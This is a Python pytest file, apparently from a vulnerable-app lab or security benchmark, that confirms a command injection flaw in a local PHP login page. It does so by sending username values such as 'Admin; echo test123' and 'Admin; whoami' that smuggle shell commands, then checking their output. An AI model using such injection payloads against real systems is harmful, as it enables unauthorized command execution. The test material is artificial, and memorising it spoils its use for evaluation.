import pytest
import requests

def test_command_execution_vulnerability(session):
    """Test if command execution vulnerability exists in CommandExec-1.php"""
    
    # Setup
    url = "http://localhost:9991/CommandExecution/CommandExec-1.php"
    test_string = "test123"
    payload = f"Admin; echo {test_string}"
    
    # Execute
    response = session.get(url, params={
        "username": payload,
        "password": "anything"
    })
    
    # Verify
    assert test_string in response.text, "Command execution vulnerability not confirmed - payload was not executed"
    
    # Additional verification - try another command
    response = session.get(url, params={
        "username": "Admin; whoami",
        "password": "anything"
    })
    
    # Should contain system user info
    assert "daemon" in response.text.lower(), \
           "Command execution vulnerability not confirmed - whoami command failed"
